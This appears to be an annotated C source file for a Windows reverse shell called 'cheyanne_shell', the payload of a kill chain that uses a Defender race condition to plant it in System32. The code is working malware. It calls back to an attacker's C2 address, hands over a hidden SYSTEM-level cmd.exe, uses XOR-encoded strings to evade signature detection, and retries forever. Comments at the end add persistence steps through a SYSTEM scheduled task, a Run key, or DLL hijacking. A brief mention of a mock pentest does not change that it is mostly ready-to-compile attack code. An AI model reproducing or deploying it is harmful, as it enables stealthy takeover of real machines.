/*
 * ============================================================================
 * BUILDING BLOCK 5 — REVERSE SHELL (ANNOTATED REFERENCE)
 * ============================================================================
 *
 * WHAT THIS IS:
 *   Post-exploitation payload. Once the TOCTOU plants this in System32,
 *   it calls back to the attack platform and provides a SYSTEM-context
 *   command shell over the network.
 *
 * DOCTRINE REFERENCE:
 *   BOOK/12_REVERSE_SHELL.md — "The Callback"
 *
 * THE GUI BUG (WHY shadow_shell BROKE):
 *   socket() creates an OVERLAPPED socket by default (WSA_FLAG_OVERLAPPED).
 *   When you cast an overlapped socket to HANDLE and pass it as
 *   stdin/stdout/stderr to cmd.exe, the synchronous reads/writes that
 *   cmd.exe performs either hang or return garbage. The shell CONNECTS
 *   but commands produce no output.
 *
 *   FIX: WSASocket() with dwFlags=0 creates a NON-OVERLAPPED socket.
 *   Synchronous I/O works. cmd.exe reads/writes correctly. That's it.
 *   One flag. That was the entire bug.
 *
 * COMPILE:
 *   cl.exe bb5_revshell_annotated.c /Fe:cheyanne_shell.exe /O1 /GS- /utf-8
 *
 *   NOTE: Must link as GUI subsystem for no-console stealth.
 *   WinMain entry point triggers this automatically with MSVC.
 *   If using /SUBSYSTEM:CONSOLE by accident, add:
 *     /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup
 *
 * RUNTIME ARGS (override compiled defaults):
 *   cheyanne_shell.exe 192.168.1.5 4444
 *   First arg = C2 IP, second arg = C2 port.
 *   If no args, uses XOR-encoded defaults compiled into the binary.
 *
 * LISTENER (on attack platform):
 *   python cheyanne_listener.py              # Auto-detect IP, interactive prompts
 *   python cheyanne_listener.py 4444         # Quick-start on port 4444
 *   python cheyanne_listener.py 4444 --gen   # Generate XOR config only
 *   ncat -lvp 4444                        # Manual listener (no automation)
 *
 * ============================================================================
 */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* linked at compile: cl.exe /link ws2_32.lib */

/* ═══════════════════════════════════════════════════════════════════════════
 * C2 CONFIGURATION
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Defaults are XOR-encoded below (no plaintext IP in binary).
 * Override at runtime: cheyanne_shell.exe <IP> <PORT>
 * Generate config with: python cheyanne_listener.py --gen
 * ═══════════════════════════════════════════════════════════════════════════ */

#define C2_DEFAULT_PORT 4444
#define RECONNECT_MS    5000
#define MAX_RETRIES     0

/* ═══════════════════════════════════════════════════════════════════════════
 * STRING OBFUSCATION — ALL signature-triggering strings XOR-encoded
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * XOR key: 0x41
 * At rest in the binary: gibberish. Decoded on stack at runtime.
 * Generate new IP arrays with: python cheyanne_listener.py --gen
 * ═══════════════════════════════════════════════════════════════════════════ */

#define XOR_KEY 0xC3

/* "cmd.exe" — XOR 0x41 */
static const unsigned char xCmd[] = {
    0xA0, 0xAE, 0xA7, 0xED, 0xA6, 0xBB, 0xA6
};
#define xCmd_LEN 7

/* "192.168.1.100" — default C2 address, XOR 0x41
 * Regenerate with cheyanne_listener.py --gen for your environment */
static const unsigned char xC2Addr[] = {
    0xF2, 0xFA, 0xF1, 0xED, 0xF2, 0xF5, 0xFB, 0xED,
    0xF2, 0xED, 0xF2, 0xF3, 0xF3
};
#define xC2Addr_LEN 13

static void XorDecode(unsigned char *buf, int len)
{
    int i;
    for (i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * PHASE 1: ESTABLISH CHANNEL — Connect to C2
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Doctrine: This is the radio check-in. The payload calls HOME to the
 * attack platform. Reverse direction (target → attacker) because:
 *   - NAT/firewalls block inbound connections to the target
 *   - Outbound connections look like normal traffic
 *   - The attacker controls the listener, not the target's firewall
 *
 * CRITICAL: WSASocket() with dwFlags=0, NOT socket().
 *
 *   socket()    = WSASocket(..., WSA_FLAG_OVERLAPPED)  ← BROKEN for I/O redirect
 *   WSASocket() = explicit flag control                ← dwFlags=0 = synchronous
 *
 * Why overlapped breaks cmd.exe:
 *   cmd.exe does synchronous ReadFile/WriteFile on its stdin/stdout handles.
 *   An overlapped handle expects OVERLAPPED structs for every I/O operation.
 *   Without them, ReadFile returns ERROR_INVALID_PARAMETER or hangs.
 *   cmd.exe doesn't know it's talking to a socket — it just does ReadFile().
 *   If the handle is overlapped, ReadFile fails silently. No output.
 *   Non-overlapped handle = synchronous ReadFile works = cmd.exe works.
 * ═══════════════════════════════════════════════════════════════════════════ */

static SOCKET EstablishChannel(const char *c2ip, int c2port)
{
    SOCKET sock;
    struct sockaddr_in target;

    /* WSASocket with dwFlags = 0
     * This is THE fix for the GUI shell bug.
     * Zero flags = non-overlapped = synchronous I/O compatible.         */
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                     NULL, 0, 0);

    if (sock == INVALID_SOCKET) {
        return INVALID_SOCKET;
    }

    target.sin_family      = AF_INET;
    target.sin_port        = htons((unsigned short)c2port);
    target.sin_addr.s_addr = inet_addr(c2ip);

    if (WSAConnect(sock, (SOCKADDR *)&target, sizeof(target),
                   NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * PHASE 1.5: SEND BANNER — Brand the shell on connect
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Doctrine: When the callback lands, the attacker sees the 22DIV / CHEYANNE
 * banner in their listener terminal. Immediate visual confirmation that
 * the payload is live and the channel is established.
 *
 * The banner is sent BEFORE cmd.exe spawns — it's a one-shot send over
 * the raw socket. Once cmd.exe takes over stdio, all further output
 * comes from the command interpreter.
 *
 * NOTE: Banner uses Unicode box-drawing characters (UTF-8 encoded).
 * The receiving terminal must support UTF-8 for correct rendering.
 * On Windows Terminal / PowerShell: works by default.
 * On Linux ncat: works if locale is UTF-8 (usually is).
 * On legacy cmd.exe: run `chcp 65001` first.
 *
 * COMPILE NOTE: Add /utf-8 flag to ensure MSVC treats source as UTF-8:
 *   cl.exe bb5_revshell.c /Fe:bb5.exe /O1 /GS- /utf-8
 * ═══════════════════════════════════════════════════════════════════════════ */

static void SendBanner(SOCKET sock)
{
    /* 22DIV block-letter logo — same ANSI-Shadow style as CheyenneShell.
     * Raw Unicode box-drawing characters. Compile with /utf-8 flag.
     * The C compiler stores these as UTF-8 byte sequences in the binary.
     * send() transmits raw bytes — the receiving terminal renders them.
     *
     * Attacker sees this in their ncat/listener when the shell connects:
     *
     *   ██████╗ ██████╗ ██████╗ ██╗██╗   ██╗
     *   ╚════██╗╚════██╗██╔══██╗██║██║   ██║
     *    █████╔╝ █████╔╝██║  ██║██║██║   ██║
     *   ██╔═══╝ ██╔═══╝ ██║  ██║██║╚██╗ ██╔╝
     *   ███████╗███████╗██████╔╝██║ ╚████╔╝
     *   ╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═══╝
     *               V A D E R
     *            george wu / 22div
     *      shadow shell - system context active
     *                                                                    */
#ifdef VDR_DEBUG
    const char *banner =
        "\r\n"
        "  ██████╗ ██████╗ ██████╗ ██╗██╗   ██╗\r\n"
        "  ╚════██╗╚════██╗██╔══██╗██║██║   ██║\r\n"
        "   █████╔╝ █████╔╝██║  ██║██║██║   ██║\r\n"
        "  ██╔═══╝ ██╔═══╝ ██║  ██║██║╚██╗ ██╔╝\r\n"
        "  ███████╗███████╗██████╔╝██║ ╚████╔╝\r\n"
        "  ╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═══╝\r\n"
        "              V A D E R\r\n"
        "           george wu / 22div\r\n"
        "     shadow shell - system context active\r\n"
        "\r\n";

    send(sock, banner, (int)strlen(banner), 0);
#endif
}

/* ═══════════════════════════════════════════════════════════════════════════
 * PHASE 2: SPAWN SHELL — Redirect cmd.exe I/O to socket
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Doctrine: Wire tap. We redirect the command interpreter's comms
 * (stdin/stdout/stderr) through our socket back to the attack platform.
 * The operator on the other end types commands, cmd.exe executes them,
 * output flows back over the wire.
 *
 * STARTUPINFO.hStdInput/Output/Error = (HANDLE)sock
 *   Winsock socket handles ARE Windows kernel handles. This cast is
 *   legal and documented. The socket becomes the pipe for all I/O.
 *
 * bInheritHandles = TRUE
 *   The child process (cmd.exe) inherits our socket handle.
 *   Without this, cmd.exe gets INVALID_HANDLE_VALUE for its stdio
 *   and immediately exits.
 *
 * CREATE_NO_WINDOW
 *   No visible console window on the target. Combined with
 *   SW_HIDE and WinMain (GUI subsystem), the payload is invisible.
 *
 * When this runs from SYSTEM context (planted via TOCTOU):
 *   cmd.exe inherits SYSTEM privileges. The attacker gets a
 *   SYSTEM shell. Every command runs as NT AUTHORITY\SYSTEM.
 * ═══════════════════════════════════════════════════════════════════════════ */

static void SpawnShell(SOCKET sock)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[8];

    /* Decode "cmd.exe" on the stack — never in plaintext in the binary */
    memcpy(cmd, xCmd, sizeof(xCmd));
    XorDecode(cmd, 7);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    /* STARTF_USESTDHANDLES: "use the handles I'm about to give you"
     * STARTF_USESHOWWINDOW: "use the wShowWindow value I'm setting"   */
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    /* SW_HIDE: cmd.exe window is invisible on target                   */
    si.wShowWindow = SW_HIDE;

    /* THE REDIRECT — all three stdio handles point to our socket.
     * Anything cmd.exe reads from stdin comes from the attacker.
     * Anything cmd.exe writes to stdout/stderr goes to the attacker.  */
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    /* Spawn cmd.exe
     *   bInheritHandles = TRUE  → child gets our socket handle
     *   CREATE_NO_WINDOW        → no console window allocated
     *   All other params NULL   → default security, environment, cwd  */
    CreateProcessA(
        NULL,                   /* lpApplicationName — NULL = use cmdline */
        (LPSTR)cmd,             /* lpCommandLine — "cmd.exe" (decoded)    */
        NULL,                   /* lpProcessAttributes — default          */
        NULL,                   /* lpThreadAttributes — default           */
        TRUE,                   /* bInheritHandles — CRITICAL: must be TRUE */
        CREATE_NO_WINDOW,       /* dwCreationFlags — stealth              */
        NULL,                   /* lpEnvironment — inherit parent's       */
        NULL,                   /* lpCurrentDirectory — inherit parent's  */
        &si,                    /* lpStartupInfo — our redirected handles  */
        &pi                     /* lpProcessInformation — child's handles  */
    );

    /* Wait for cmd.exe to exit.
     * This blocks until the attacker closes the connection or types 'exit'.
     * While blocked, the shell is live — commands flow in, output flows out. */
    WaitForSingleObject(pi.hProcess, INFINITE);

    /* Clean up child process handles */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * MAIN — Reconnection Loop
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Doctrine: Persistent comms schedule. If the connection drops (attacker
 * closes listener, network interruption, cmd.exe exits), the payload
 * sleeps and retries. This provides persistence without registry keys
 * or scheduled tasks — the process itself keeps trying.
 *
 * WinMain = GUI subsystem = no console window for the payload process.
 * Combined with SW_HIDE on cmd.exe and CREATE_NO_WINDOW, the entire
 * operation is invisible to the target user.
 *
 * MAX_RETRIES = 0 means infinite retry. The payload will keep calling
 * home until the process is killed or the machine shuts down.
 * For true persistence across reboots, a separate mechanism is needed
 * (scheduled task, registry Run key, or DLL search order hijack).
 * ═══════════════════════════════════════════════════════════════════════════ */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    WSADATA wsData;
    SOCKET channel;
    int attempts = 0;
    char c2ip[64];
    int c2port = C2_DEFAULT_PORT;
    unsigned char ipBuf[64];

    (void)hInst; (void)hPrev; (void)nShow;

    /* ── RESOLVE C2 ADDRESS ──
     * Priority: runtime args > XOR-encoded defaults.
     * Runtime: cheyanne_shell.exe 192.168.1.5 4444
     * Default: decoded from xC2Addr[] at runtime (no plaintext in binary) */
    if (lpCmd && lpCmd[0]) {
        /* Parse "IP PORT" from command line */
        c2ip[0] = 0;
        sscanf(lpCmd, "%63s %d", c2ip, &c2port);
    }
    if (!lpCmd || !lpCmd[0] || !c2ip[0]) {
        /* Decode XOR-encoded default IP */
        memcpy(ipBuf, xC2Addr, xC2Addr_LEN);
        XorDecode(ipBuf, xC2Addr_LEN);
        ipBuf[xC2Addr_LEN] = 0;
        strncpy(c2ip, (char *)ipBuf, sizeof(c2ip) - 1);
        c2ip[sizeof(c2ip) - 1] = 0;
        /* Zero decoded buffer — don't leave plaintext IP on stack */
        memset(ipBuf, 0, sizeof(ipBuf));
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        return 1;
    }

    /* ── RECONNECTION LOOP ──
     * MAX_RETRIES = 0: infinite (persistent callback)
     * MAX_RETRIES > 0: give up after N consecutive failures           */
    while (MAX_RETRIES == 0 || attempts < MAX_RETRIES) {

        channel = EstablishChannel(c2ip, c2port);

        if (channel != INVALID_SOCKET) {
            SendBanner(channel);
            SpawnShell(channel);
            closesocket(channel);
            attempts = 0;
        } else {
            attempts++;
        }

        Sleep(RECONNECT_MS);
    }

    WSACleanup();
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * INTEGRATION WITH TOCTOU CHAIN
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This payload is what cheyanne_toctou.c PLANTS in System32.
 * The kill chain flow:
 *
 *   1. cheyanne_toctou.exe runs as standard user
 *   2. TOCTOU redirects Defender's SYSTEM-context file operation
 *   3. Payload .exe lands in C:\Windows\System32\
 *   4. Execution trigger fires the payload (DLL hijack, schtasks, etc.)
 *   5. Payload runs as SYSTEM → connects to attacker → SYSTEM shell
 *
 * The payload itself doesn't need to know HOW it got into System32.
 * It just connects back and spawns a shell. Separation of concerns:
 *   - cheyanne_toctou.c = delivery (TOCTOU race condition)
 *   - bb5_revshell.c = payload (reverse shell callback)
 *
 * EXECUTION TRIGGERS (after payload is planted):
 *
 *   Option A — DLL Search Order Hijack:
 *     Rename payload to a DLL that a SYSTEM service loads.
 *     Requires DllMain entry point instead of WinMain.
 *     Most stealthy — piggybacks on legitimate service startup.
 *
 *   Option B — Scheduled Task:
 *     From SYSTEM shell (first connection), create a schtask:
 *       schtasks /create /tn "Update" /tr "C:\Windows\System32\payload.exe"
 *                /sc onlogon /ru SYSTEM
 *     Survives reboot. Visible in Task Scheduler if someone looks.
 *
 *   Option C — Registry Run Key:
 *     From SYSTEM shell, add to HKLM\SOFTWARE\Microsoft\Windows\
 *       CurrentVersion\Run
 *     Runs on every login. Visible in msconfig/autoruns.
 *
 *   For the mock corporate pentest: Option B (scheduled task) is the
 *   clearest to demonstrate and document in the engagement report.
 * ═══════════════════════════════════════════════════════════════════════════ */
